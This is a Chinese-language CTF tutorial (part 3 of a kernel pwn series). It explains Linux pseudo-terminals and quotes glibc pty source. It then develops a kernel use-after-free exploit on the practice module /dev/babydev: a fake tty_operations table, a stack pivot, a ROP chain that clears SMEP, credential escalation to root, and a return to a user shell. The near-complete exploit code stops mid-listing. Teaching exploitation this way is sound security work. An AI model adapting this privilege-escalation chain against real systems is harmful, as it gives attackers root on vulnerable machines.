@@ -1,0 +1,1033 @@
+# Kernel pwn CTF 入门 - 3
+
+阅读量 **180367**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2021-10-28 14:30:30
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 四、小试牛刀
+
+> 接上文 [Kernel pwn CTF 入门 – 2](https://www.anquanke.com/post/id/255883)
+
+###  5\. kernel 的 UAF 利用
+
+####  b. Kernel ROP
+
+#####  1) 终端设备类型简介
+
+在 Linux 中 `/dev` 目录下，终端设备文件通常有以下几种：
+
+> 注意：以下这些类型的终端不一定在所有发行版 linux 上都存在，例如 `/dev/ttyprintk` 就不存在于我的 kali linux 上。
+
+  1. 串行端口终端 （ **/dev/ttySn** ） ：是用于与串行端口连接的终端设备，类似于 Windows 下的 COM。
+  2. 控制终端 （ **/dev/tty** ） ： **当前进程** 的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件。  
+
+> 可以使用 `tty` 命令查看其具体对应的终端设备，也可以使用 `ps -ax` 来查看进程与控制终端的映射关系。
+
+![](https://p5.ssl.qhimg.com/t01d25f0c4962239b68.png)
+
+> 在 qemu 下，可以通过指定`-append 'console=ttyS0'` 参数，设置 linux kernel tty 映射至
+> `/dev/ttySn` 上。
+
+![](https://p5.ssl.qhimg.com/t019868754ccc6e8044.png)
+
+  3. 虚拟终端与控制台 （ **/dev/ttyN, /dev/console** ） ：在Linux 系统中，计算机显示器通常被称为 **控制台终端** (Console)。而在 linux **初始字符界面** 下，为了同时处理多任务，自然需要多个终端的切换。这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为 **虚拟终端** 。  
+
+> 虚拟终端和控制台的差别需要参考历史。在以前，终端是通过串口连接上的，不是计算机本身就有的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。
+>
+> 简单的说， **控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备**
+>
+> 计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。也就是说，控制台是计算机的基本设备，而终端是附加设备。
+>
+> 由于控制台也有终端一样的功能，控制台有时候也被模糊的统称为终端。
+>
+> 计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。
+>
+> 由于时代的发展，硬件资源的丰富，终端和控制台的概念已经慢慢淡化。
+
+这种虚拟终端的切换与我们X11中图形界面中多个终端的切换不同，它属于 **更高级别终端的切换** 。我们日常所使用的图形界面下的终端，属于某个
+**虚拟图形终端界面** 下的多个 **伪终端** 。
+
+可以通过键入 `Ctrl+Alt+F1` （其中的 F **x** 表示切换至第 **x** 个终端，例如 F1）来切换虚拟终端。
+
+> tty0则是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上。
+
+默认情况下，F1-F6均为字符终端界面，F7-F12为图形终端界面。
+
+> 当切换至字符终端界面后，可再次键入 `Ctrl+Alt+F7`切回图形终端界面。
+
+![](https://p5.ssl.qhimg.com/t01770f6b9738ee88ea.png)
+
+  4. 伪终端 （ **/dev/pty** ）： **伪终端(Pseudo Terminal)** 是成对的 **逻辑** 终端设备，其行为与普通终端非常相似。所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口。当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。伪终端的两个终端设备分别称为 master 设备和 slave 设备，其中 slave 设备的行为与普通终端无异。当某个程序把某个 master 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 slave 设备。通常 slave 设备也会被其他程序用于读写。因此这两个程序便可以通过这对逻辑终端来进行通信。 
+
+现代 linux 主要使用 **UNIX 98 pseudoterminals** 标准，即 **pts(pseudo-terminal slave,
+/dev/pts/n)** 和 **ptmx(pseudo-terminal master, /dev/ptmx)** 搭配来实现 pty。
+
+伪终端的使用一会将在下面详细说明。
+
+  5. 其他终端 （诸如 **/dev/ttyprintk** 等等）。这类终端通常是用于特殊的目的，例如 **/dev/ttyprintk** 直接与内核缓冲区相连：
+
+#####  2) 伪终端的使用
+
+伪终端的具体实现分为两种
+
+  * UNIX 98 pseudoterminals，涉及 `/dev/ptmx` （master）和 `/dev/pts/*`（slave）
+  * 老式 BSD pseudoterminals，涉及 `/dev/pty[p-za-e][0-9a-f]`(master) 和 `/dev/tty[p-za-e][0-9a-f]`(slave)
+
+这里我们只介绍 UNIX 98 pseudoterminals。
+
+`/dev/ptmx`这个设备文件主要用于打开一对伪终端设备。当某个进程 open 了 `/dev/ptmx`后，该进程将获取到一个指向
+**新伪终端master设备（PTM）** 的文件描述符，同时对应的 **新伪终端slave设备（PTS）** 将在
+`/dev/pts/`下被创建。不同进程打开 `/dev/ptmx` 后所获得到的 PTM、PTS 都是互不相同的。
+
+进程打开 /dev/ptmx 有两种方式
+
+  1. 手动使用 `open("/dev/ptmx", O_RDWR | O_NOCTTY)` 打开
+  2. 通过标准库函数 `getpt`
+    
+        #define _GNU_SOURCE             /* See feature_test_macros(7) */
+    #include <stdlib.h>
+    
+    int getpt(void);
+    
+
+  3. 通过标准库函数 `posix_openpt`
+    
+        #include <stdlib.h>
+    #include <fcntl.h>
+    
+    int posix_openpt(int flags);
+    
+
+> 上述几种方式完全等价，只是 **使用标准库函数** 的方式会更通用一点，因为 ptmx 在某些 linux 发行版上可能不位于
+> `/dev/ptmx`，同时标准库函数还会做其他额外的检测逻辑。
+
+进程可以调用`ptsname(ptm_fd)`来获取到对应的 PTS 的路径。
+
+需要注意的是，必须先顺序调用以下两个函数后才能打开 PTS:
+
+  1. `grantpt(ptm_fd)`：更改 slave 的模式和所有者，获取其所有权
+  2. `unlockpt(ptm_fd)`：对 slave 解锁
+
+伪终端主要用于两个应用场景
+
+  * 终端仿真器，为其他远程登录程序（例如 ssh）提供终端功能
+  * 可用于向 **通常拒绝从管道读取输入** 的程序（例如 su 和 passwd）发送输入
+
+上述几步是使用伪终端所必须调用的一些底层函数。但在实际的伪终端编程中，更加常用的是以下几个函数：
+
+> 我们可以通过阅读这些函数的源代码来了解伪终端的使用方式。
+
+  * `openpty`：找到一个空闲的伪终端，并将打开好后的 master 和 slave 终端的文件描述符返回。源代码如下: 
+    
+        /* Create pseudo tty master slave pair and set terminal attributes
+       according to TERMP and WINP.  Return handles for both ends in
+       AMASTER and ASLAVE, and return the name of the slave end in NAME.  */
+    int
+    openpty (int *amaster, int *aslave, char *name,
+      const struct termios *termp, const struct winsize *winp)
+    {
+    #ifdef PATH_MAX
+      char _buf[PATH_MAX];
+    #else
+      char _buf[512];
+    #endif
+      char *buf = _buf;
+      int master, ret = -1, slave = -1;
+    
+      *buf = '\0';
+    
+      master = getpt ();
+      if (master == -1)
+        return -1;
+    
+      if (grantpt (master))
+        goto on_error;
+    
+      if (unlockpt (master))
+        goto on_error;
+    
+    #ifdef TIOCGPTPEER
+      /* Try to allocate slave fd solely based on master fd first. */
+      slave = ioctl (master, TIOCGPTPEER, O_RDWR | O_NOCTTY);
+    #endif
+      if (slave == -1)
+        {
+          /* Fallback to path-based slave fd allocation in case kernel doesn't
+           * support TIOCGPTPEER.
+           */
+          if (pts_name (master, &buf, sizeof (_buf)))
+            goto on_error;
+    
+          slave = open (buf, O_RDWR | O_NOCTTY);
+          if (slave == -1)
+            goto on_error;
+        }
+    
+      /* XXX Should we ignore errors here?  */
+      if (termp)
+        tcsetattr (slave, TCSAFLUSH, termp);
+    #ifdef TIOCSWINSZ
+      if (winp)
+        ioctl (slave, TIOCSWINSZ, winp);
+    #endif
+    
+      *amaster = master;
+      *aslave = slave;
+      if (name != NULL)
+        {
+          if (*buf == '\0')
+            if (pts_name (master, &buf, sizeof (_buf)))
+              goto on_error;
+    
+          strcpy (name, buf);
+        }
+    
+      ret = 0;
+    
+     on_error:
+      if (ret == -1) {
+        close (master);
+    
+        if (slave != -1)
+          close (slave);
+      }
+    
+      if (buf != _buf)
+        free (buf);
+    
+      return ret;
+    }
+    
+
+  * `login_tty`：用于实现在指定的终端上启动登录会话。源代码如下所示： 
+    
+        int login_tty (int fd)
+    {
+        // 启动新会话
+      (void) setsid();
+        // 设置为当前 fd 为控制终端
+    #ifdef TIOCSCTTY
+      if (ioctl(fd, TIOCSCTTY, (char *)NULL) == -1)
+        return (-1);
+    #else
+      {
+        /* This might work.  */
+        char *fdname = ttyname (fd);
+        int newfd;
+        if (fdname)
+          {
+            if (fd != 0)
+        (void) close (0);
+            if (fd != 1)
+        (void) close (1);
+            if (fd != 2)
+        (void) close (2);
+            newfd = open (fdname, O_RDWR);
+            (void) close (newfd);
+          }
+      }
+    #endif
+      while (dup2(fd, 0) == -1 && errno == EBUSY)
+        ;
+      while (dup2(fd, 1) == -1 && errno == EBUSY)
+        ;
+      while (dup2(fd, 2) == -1 && errno == EBUSY)
+        ;
+      if (fd > 2)
+        (void) close(fd);
+      return (0);
+    }
+    
+
+  * `forkpty`：整合了`openpty`, `fork` 和 `login_tty`，在网络服务程序可用于为新登录用户打开一对伪终端，并创建相应的会话子进程。源代码如下： 
+    
+        int
+    forkpty (int *amaster, char *name, const struct termios *termp,
+       const struct winsize *winp)
+    {
+      int master, slave, pid;
+      // 启动新 pty
+      if (openpty (&master, &slave, name, termp, winp) == -1)
+        return -1;
+    
+      switch (pid = fork ())
+        {
+        case -1:
+          close (master);
+          close (slave);
+          return -1;
+        case 0:
+          /* Child.  */
+          close (master);
+          if (login_tty (slave))
+      _exit (1);
+    
+          return 0;
+        default:
+          /* Parent.  */
+          *amaster = master;
+          close (slave);
+    
+          return pid;
+        }
+    }
+    
+
+#####  3) tty_struct 结构的利用
+
+当我们执行 `open("/dev/ptmx", flag)` 时，内核会通过以下函数调用链，分配一个 `struct tty_struct` 结构体：
+
+    
+    
+    ptmx_open (drivers/tty/pty.c)
+    -> tty_init_dev (drivers/tty/tty_io.c)
+      -> alloc_tty_struct (drivers/tty/tty_io.c)
+    
+
+`struct tty_struct` 的结构如下所示：
+
+> sizeof(struct tty_struct) == 0x2e0
+    
+    
+    struct tty_struct {
+      int  magic;
+      struct kref kref;
+      struct device *dev;
+      struct tty_driver *driver;
+      const struct tty_operations *ops;
+      int index;
+    
+      /* Protects ldisc changes: Lock tty not pty */
+      struct ld_semaphore ldisc_sem;
+      struct tty_ldisc *ldisc;
+    
+      struct mutex atomic_write_lock;
+      struct mutex legacy_mutex;
+      struct mutex throttle_mutex;
+      struct rw_semaphore termios_rwsem;
+      struct mutex winsize_mutex;
+      spinlock_t ctrl_lock;
+      spinlock_t flow_lock;
+      /* Termios values are protected by the termios rwsem */
+      struct ktermios termios, termios_locked;
+      struct termiox *termiox;  /* May be NULL for unsupported */
+      char name[64];
+      struct pid *pgrp;    /* Protected by ctrl lock */
+      struct pid *session;
+      unsigned long flags;
+      int count;
+      struct winsize winsize;    /* winsize_mutex */
+      unsigned long stopped:1,  /* flow_lock */
+              flow_stopped:1,
+              unused:BITS_PER_LONG - 2;
+      int hw_stopped;
+      unsigned long ctrl_status:8,  /* ctrl_lock */
+              packet:1,
+              unused_ctrl:BITS_PER_LONG - 9;
+      unsigned int receive_room;  /* Bytes free for queue */
+      int flow_change;
+    
+      struct tty_struct *link;
+      struct fasync_struct *fasync;
+      int alt_speed;    /* For magic substitution of 38400 bps */
+      wait_queue_head_t write_wait;
+      wait_queue_head_t read_wait;
+      struct work_struct hangup_work;
+      void *disc_data;
+      void *driver_data;
+      struct list_head tty_files;
+    
+    #define N_TTY_BUF_SIZE 4096
+    
+      int closing;
+      unsigned char *write_buf;
+      int write_cnt;
+      /* If the tty has a pending do_SAK, queue it here - akpm */
+      struct work_struct SAK_work;
+      struct tty_port *port;
+    };
+    
+
+注意到第五个字段 `const struct tty_operations *ops`，`struct
+tty_operations`结构体实际上是多个函数指针的集合：
+
+    
+    
+    struct tty_operations {
+      struct tty_struct * (*lookup)(struct tty_driver *driver,
+          struct inode *inode, int idx);
+      int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+      void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+      int  (*open)(struct tty_struct * tty, struct file * filp);
+      void (*close)(struct tty_struct * tty, struct file * filp);
+      void (*shutdown)(struct tty_struct *tty);
+      void (*cleanup)(struct tty_struct *tty);
+      int  (*write)(struct tty_struct * tty,
+              const unsigned char *buf, int count);
+      int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+      void (*flush_chars)(struct tty_struct *tty);
+      int  (*write_room)(struct tty_struct *tty);
+      int  (*chars_in_buffer)(struct tty_struct *tty);
+      int  (*ioctl)(struct tty_struct *tty,
+            unsigned int cmd, unsigned long arg);
+      long (*compat_ioctl)(struct tty_struct *tty,
+               unsigned int cmd, unsigned long arg);
+      void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+      void (*throttle)(struct tty_struct * tty);
+      void (*unthrottle)(struct tty_struct * tty);
+      void (*stop)(struct tty_struct *tty);
+      void (*start)(struct tty_struct *tty);
+      void (*hangup)(struct tty_struct *tty);
+      int (*break_ctl)(struct tty_struct *tty, int state);
+      void (*flush_buffer)(struct tty_struct *tty);
+      void (*set_ldisc)(struct tty_struct *tty);
+      void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+      void (*send_xchar)(struct tty_struct *tty, char ch);
+      int (*tiocmget)(struct tty_struct *tty);
+      int (*tiocmset)(struct tty_struct *tty,
+          unsigned int set, unsigned int clear);
+      int (*resize)(struct tty_struct *tty, struct winsize *ws);
+      int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+      int (*get_icount)(struct tty_struct *tty,
+            struct serial_icounter_struct *icount);
+    #ifdef CONFIG_CONSOLE_POLL
+      int (*poll_init)(struct tty_driver *driver, int line, char *options);
+      int (*poll_get_char)(struct tty_driver *driver, int line);
+      void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+    #endif
+      const struct file_operations *proc_fops;
+    };
+    
+
+我们可以试着通过 UAF, 修改 **新** 分配的 tty_struct 上的 `const struct tty_operations
+*ops`，使其指向一个伪造的 `tty_operations`结构体，这样就可以搭配一些操作（例如 open、ioctl 等等）来劫持控制流。
+
+> 注：tty_operations 函数指针的使用，位于`drivers/tty/tty_io.c`的各类 `tty_xxx`函数中。
+
+但由于开启了 SMEP 保护，此时的控制流 **只能在内核代码中执行** ，不能跳转至用户代码。
+
+#####  4) ROP 利用
+
+为了达到提权目的，我们需要完成以下几件事情：
+
+  1. 提权
+  2. 绕过 SMEP，执行用户代码
+
+######  4.1) 劫持栈指针
+
+我们需要通过 ROP 来完成上述操作，但问题是， **用户无法控制内核栈** 。因此我们必须使用一些特殊 gadget 来 **将栈指针劫持到用户空间**
+，之后再利用用户空间上的 ROP 链进行一系列控制流跳转。
+
+获取 gadget 的方式有很多。可以使用之前用的 `ROPgadget` 工具，优点是可以将分析结果通过管道保存至文件中，但缺点是该工具在 kernel
+层面上会跑的很慢。
+
+    
+    
+    ROPgadget --binary vmlinux
+    
+
+有个速度比较快的工具可以试试，那就是 `ropper`工具：
+
+    
+    
+    pip3 install ropper
+    ropper --file vmlinux --console
+    
+
+我们可以手动构造一个 **fake_tty_operations** ，并修改其中的 `write` 函数指针指向一个 xchg 指令。这样当对
+`/dev/ptmx` 执行 write 操作时，内核就会通过以下调用链：
+
+> `tty_write` -> `do_tty_write` -> `do_tty_write` -> `n_tty_write` ->
+> `tty->ops->write`
+
+进一步使用到 `tty->ops->write`函数指针，最终执行 `xchg` 指令。
+
+但问题是，执行什么样的 xchg 指令？通过动态调试与 IDA 静态分析，最终找到了实际调用 `tty->ops->write`的指令位置：
+
+    
+    
+    .text:FFFFFFFF814DC0C3                 call    qword ptr [rax+38h]
+    
+
+由于当控制流执行至此处时，只有 `%rax` 是用户可控的（即`fake_tty_operations`基地址），因此我们尝试使用以下 gadget，劫持
+`%rsp` 指针至用户空间：
+
+    
+    
+    0xffffffff8100008a : xchg eax, esp ; ret
+    
+
+> 注意：`xchg eax, esp`将 **清空两个寄存器的高位部分** 。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用
+> mmap 函数占据这块内存，并放上 ROP 链。
+
+以下是劫持栈指针的部分代码：
+
+    
+    
+    int fd1 = open("/dev/babydev", O_RDWR);
+    int fd2 = open("/dev/babydev", O_RDWR);
+    ioctl(fd1, 65537, 0x2e0);
+    
+    close(fd1);
+    
+    // 申请 tty_struct
+    int master_fd = open("/dev/ptmx", O_RDWR);
+    
+    // 构造一个 fake tty_operators
+    u_int64_t fake_tty_ops[] = {
+        0, 0, 0, 0, 0, 0, 0,
+        xchg_eax_esp_addr, // int  (*write)(struct tty_struct*, const unsigned char *, int)
+    };
+    printf("[+] fake_tty_ops constructed\n");
+    
+    u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
+    printf("[+] hijacked_stack addr: %p\n", (char*)hijacked_stack_addr);
+    
+    char* fake_stack = NULL;
+    if ((fake_stack = mmap(
+        (char*)(hijacked_stack_addr & (~0xfff)),    // addr, 页对齐
+        0x1000,                                     // length
+        PROT_READ | PROT_WRITE,                     // prot
+        MAP_PRIVATE | MAP_ANONYMOUS,                // flags
+        -1,                                         // fd
+        0)                                          // offset
+        ) == MAP_FAILED)  
+        perror("mmap");
+    
+    // 调试时先装载页面
+    fake_stack[0] = 0;
+    printf("[+]     fake_stack addr: %p\n", fake_stack);
+    
+    // 读取 tty_struct 结构体的所有数据
+    int ops_ptr_offset = 4 + 4 + 8 + 8;
+    char overwrite_mem[ops_ptr_offset + 8];
+    char** ops_ptr_addr = (char**)(overwrite_mem + ops_ptr_offset);
+    
+    read(fd2, overwrite_mem, sizeof(overwrite_mem));
+    printf("[+] origin ops ptr addr: %p\n", *ops_ptr_addr);
+    
+    // 修改并覆写 tty_struct 结构体
+    *ops_ptr_addr = (char*)fake_tty_ops;
+    write(fd2, overwrite_mem, sizeof(overwrite_mem));
+    printf("[+] hacked ops ptr addr: %p\n", *ops_ptr_addr);
+    
+    // 触发 tty_write
+    // 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT
+    int buf[] = {0};
+    write(master_fd, buf, 8);
+    
+
+可以看到栈指针已经成功被劫持到用户空间中：
+
+![](https://p3.ssl.qhimg.com/t01f7ce1c9771db93df.png)
+
+######  4.2) 关闭 SMEP + ret2usr提权
+
+劫持栈指针后，我们现在可以尝试提权。正常来说，在 **内核** 里需要执行以下代码来进行提权：
+
+    
+    
+    struct cred * root_cred = prepare_kernel_cred(NULL);
+    commit_creds(root_cred);
+    
+
+其中，`prepare_kernel_cred`函数用于获取传入 `task_struct` 结构指针的 cred 结构。需要注意的是，如果传入的指针是
+**NULL** ，则 **函数返回的 cred 结构将是 init_cred，其中uid、gid等等均为 root 级别** 。
+
+`commit_creds`函数用于将当前进程的 `cred` 更新为新传入的 `cred` 结构，如果我们将当前进程的 cred 更新为 root 等级的
+cred，则达到我们提权的目的。
+
+为了利用简便，我们可以先关闭 SMEP，跳转进用户代码中直接执行预编译好的提权指令。
+
+SMEP 标志在寄存器 CR4 上，因此我们可以通过重设 CR4 寄存器来关闭 SMEP，最后提权：
+
+![](https://p0.ssl.qhimg.com/t0133b12956e94e68dd.jpg)
+
+我们先看一下当前的 cr4 寄存器的值
+
+![](https://p0.ssl.qhimg.com/t01cf3026d3e576f3c0.png)
+
+之后只要将 cr4 覆盖为 0x6f0 即可。
+
+相关实现如下所示：
+
+    
+    
+    void set_root_cred(){
+        void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
+        void (*commit_creds)(void*) = (void (*)(void*))commit_creds_addr;
+    
+        void * root_cred = prepare_kernel_cred(NULL);
+        commit_creds(root_cred);
+    }
+    
+    int main()
+    {
+        [...]
+        // 准备 ROP
+        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
+        hijacked_stack_ptr[0] = pop_rdi_addr;              // pop rdi; ret
+        hijacked_stack_ptr[1] = 0x6f0;                     // new cr4
+        hijacked_stack_ptr[2] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
+        hijacked_stack_ptr[3] = 0;                         // dummy
+        hijacked_stack_ptr[4] = (u_int64_t)set_root_cred;  // set root
+        // todo ROP
+        [...]
+    }
+    
+
+######  4.3) 返回用户态 + get shell
+
+> 当我们提权了当前进程后，剩下要做的事情就是 **返回至用户态** 并启动新shell。
+>
+> 可能有小伙伴会问，既然都劫持了内核控制流了，那是不是可以直接启动 shell ？为什么还要返回至用户态？
+>
+>
+> 个人的理解是，劫持内核控制流后，由于改变了内核的正常运行逻辑，因此此时内核鲁棒性降低，稍微敏感的一些操作都有可能会导致内核挂掉。最稳妥的方式是回到更加稳定的用户态中，而且
+> root 权限的用户态程序同样可以做到内核权限所能做到的事情。
+>
+> 除了上面所说的以外，还有一个很重要的原因是：一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。
+
+如何从内核态返回至用户态中？我们可以从 syscall 的入口代码入手，先看看这部分代码：
+
+    
+    
+    ENTRY(entry_SYSCALL_64)
+      SWAPGS_UNSAFE_STACK
+    GLOBAL(entry_SYSCALL_64_after_swapgs)
+      movq  %rsp, PER_CPU_VAR(rsp_scratch)
+      movq  PER_CPU_VAR(cpu_current_top_of_stack), %rsp
+    
+      /* Construct struct pt_regs on stack */
+      pushq  $__USER_DS      /* pt_regs->ss */
+      pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
+    
+      ENABLE_INTERRUPTS(CLBR_NONE)
+      pushq  %r11        /* pt_regs->flags */
+      pushq  $__USER_CS      /* pt_regs->cs */
+      pushq  %rcx        /* pt_regs->ip */
+      pushq  %rax        /* pt_regs->orig_ax */
+      pushq  %rdi        /* pt_regs->di */
+      pushq  %rsi        /* pt_regs->si */
+      pushq  %rdx        /* pt_regs->dx */
+      pushq  %rcx        /* pt_regs->cx */
+      pushq  $-ENOSYS      /* pt_regs->ax */
+      pushq  %r8        /* pt_regs->r8 */
+      pushq  %r9        /* pt_regs->r9 */
+      pushq  %r10        /* pt_regs->r10 */
+      pushq  %r11        /* pt_regs->r11 */
+      sub  $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */
+    
+
+可以看到，控制流以进入入口点后，并立即执行`swapgs`指令，将当前 GS 寄存器切换成 kernel
+GS，之后切换栈指针至内核栈，并在内核栈中构造结构体 `pt_regs`。
+
+该结构体声明如下：
+
+    
+    
+    struct pt_regs {
+    /*
+     * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
+     * unless syscall needs a complete, fully filled "struct pt_regs".
+     */
+      unsigned long r15;
+      unsigned long r14;
+      unsigned long r13;
+      unsigned long r12;
+      unsigned long rbp;
+      unsigned long rbx;
+    /* These regs are callee-clobbered. Always saved on kernel entry. */
+      unsigned long r11;
+      unsigned long r10;
+      unsigned long r9;
+      unsigned long r8;
+      unsigned long rax;
+      unsigned long rcx;
+      unsigned long rdx;
+      unsigned long rsi;
+      unsigned long rdi;
+    /*
+     * On syscall entry, this is syscall#. On CPU exception, this is error code.
+     * On hw interrupt, it's IRQ number:
+     */
+      unsigned long orig_rax;
+    /* Return frame for iretq */
+      unsigned long rip;
+      unsigned long cs;
+      unsigned long eflags;
+      unsigned long rsp;
+      unsigned long ss;
+    /* top of stack page */
+    };
+    
+
+结合动态调试可以发现，在控制流到达 syscall 入口点之前，`pt_regs`结构体中的 `rip`、`cs`、`eflags`、`rsp` 以及
+`ss` 五个寄存器均已压栈。
+
+我们还可以在该文件中找到下面的代码片段
+
+    
+    
+    opportunistic_sysret_failed:
+      SWAPGS
+      jmp  restore_c_regs_and_iret
+    
+    [...]
+    
+    /*
+     * At this label, code paths which return to kernel and to user,
+     * which come from interrupts/exception and from syscalls, merge.
+     */
+    GLOBAL(restore_regs_and_iret)
+      RESTORE_EXTRA_REGS
+    restore_c_regs_and_iret:
+      RESTORE_C_REGS
+      REMOVE_PT_GPREGS_FROM_STACK 8
+      INTERRUPT_RETURN
+    
+
+根据上面的分析信息，我们不难推断出，若想从内核态返回至用户态，则需要依次完成以下两件事情：
+
+  * 再执行一次 swapgs 指令，将当前的 GS 寄存器从 kernel gs 换回 user gs
+  * 手动在栈上构造 iret 指令所需要的5个寄存器值，然后调用 iret 指令。
+
+因此最终实现的部分代码如下：
+
+    
+    
+    void get_shell() {
+        printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
+        system("/bin/sh");
+    }
+    
+    unsigned long user_cs, user_eflags, user_rsp, user_ss;
+    
+    void save_iret_data() {
+        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
+        __asm__ __volatile__ ("pushf");
+        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
+        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
+        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
+    }
+    
+    int main() {
+        save_iret_data();
+        printf(
+            "[+] iret data saved.\n"
+            "    user_cs: %ld\n"
+            "    user_eflags: %ld\n"
+            "    user_rsp: %p\n"
+            "    user_ss: %ld\n",
+            user_cs, user_eflags, (char*)user_rsp, user_ss
+        );
+        [...]
+        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
+        int idx = 0;
+        hijacked_stack_ptr[idx++] = pop_rdi_addr;              // pop rdi; ret
+        hijacked_stack_ptr[idx++] = 0x6f0;
+        hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
+        hijacked_stack_ptr[idx++] = 0;                         // dummy
+        hijacked_stack_ptr[idx++] = (u_int64_t)set_root_cred;
+        // 新添加的 ROP 链
+        hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;
+        hijacked_stack_ptr[idx++] = 0;                          // dummy
+        hijacked_stack_ptr[idx++] = iretq_addr;
+        hijacked_stack_ptr[idx++] = (u_int64_t)get_shell;       // iret_data.rip
+        hijacked_stack_ptr[idx++] = user_cs;
+        hijacked_stack_ptr[idx++] = user_eflags;
+        hijacked_stack_ptr[idx++] = user_rsp;
+        hijacked_stack_ptr[idx++] = user_ss;
+        [...]
+    }
+    
+
+######  4.4) ROP 注意点
+
+在往常的用户层面的利用，我们无需关注 **缺页错误**
+这样的一个无关紧要的异常。然而在内核利用中，缺页错误往往非常致命（不管是否是可恢复的，即正常的缺页错误也很致命），大概率会直接引发 **double
+fault** ，致使内核重启：
+
+![](https://p1.ssl.qhimg.com/t01905b602b2b8c1a57.png)
+
+因此在构造 ROP 链时，应尽量避免在内核中直接引用那些 **尚未装载页面的内存页** 。
+
+再一个问题是单步调试。在调试内核 ROP
+链时，有概率会在单步执行时直接跑炸内核，但先给该位置下断点后，再跑至该位置则执行正常。这个调试……仁者见仁智者见智吧（滑稽）
+
+######  4.5) 完整 exploit
+
+完整的 exploit 如下所示：
+
+    
+    
+    #include <assert.h>
+    #include <fcntl.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/ioctl.h>
+    #include <sys/mman.h>
+    #include <unistd.h>
+    
+    #define xchg_eax_esp_addr           0xffffffff8100008a
+    #define prepare_kernel_cred_addr    0xffffffff810a1810
+    #define commit_creds_addr           0xffffffff810a1420
+    #define pop_rdi_addr                0xffffffff810d238d
+    #define mov_cr4_rdi_pop_rbp_addr    0xffffffff81004d80
+    #define swapgs_pop_rbp_addr         0xffffffff81063694          
+    #define iretq_addr                  0xffffffff814e35ef
+    
+    void set_root_cred(){
+        void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
+        void (*commit_creds)(void*) = (void (*)(void*))commit_creds_addr;
+    
+        void * root_cred = prepare_kernel_cred(NULL);
+        commit_creds(root_cred);
+    }
+    
+    void get_shell() {
+        printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
+        system("/bin/sh");
+    }
+    
+    unsigned long user_cs, user_eflags, user_rsp, user_ss;
+    
+    void save_iret_data() {
+        __asm__ __volatile__ ("mov %%cs, %0" : "=r" (user_cs));
+        __asm__ __volatile__ ("pushf");
+        __asm__ __volatile__ ("pop %0" : "=r" (user_eflags));
+        __asm__ __volatile__ ("mov %%rsp, %0" : "=r" (user_rsp));
+        __asm__ __volatile__ ("mov %%ss, %0" : "=r" (user_ss));
+    }
+    
+    int main() {
+        save_iret_data();
+        printf(
+            "[+] iret data saved.\n"
+            "    user_cs: %ld\n"
+            "    user_eflags: %ld\n"
+            "    user_rsp: %p\n"
+            "    user_ss: %ld\n",
+            user_cs, user_eflags, (char*)user_rsp, user_ss
+        );
+    
+        int fd1 = open("/dev/babydev", O_RDWR);
+        int fd2 = open("/dev/babydev", O_RDWR);
+        ioctl(fd1, 65537, 0x2e0);
+    
+        close(fd1);
+    
+        // 申请 tty_struct
+        int master_fd = open("/dev/ptmx", O_RDWR);
+    
+        // 构造一个 fake tty_operators
+        u_int64_t fake_tty_ops[] = {
+            0, 0, 0, 0, 0, 0, 0,
+            xchg_eax_esp_addr, // int  (*write)(struct tty_struct*, const unsigned char *, int)
+        };
+        printf("[+] fake_tty_ops constructed\n");
+    
+        u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
+        printf("[+] hijacked_stack addr: %p\n", (char*)hijacked_stack_addr);
+    
+        char* fake_stack = NULL;
+        if ((fake_stack = mmap(
+                (char*)((hijacked_stack_addr & (~0xffff))),  // addr, 页对齐
+                0x10000,                                     // length
+                PROT_READ | PROT_WRITE,                     // prot
+                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,    // flags
+                -1,                                         // fd
+                0)                                          // offset
+            ) == MAP_FAILED)  
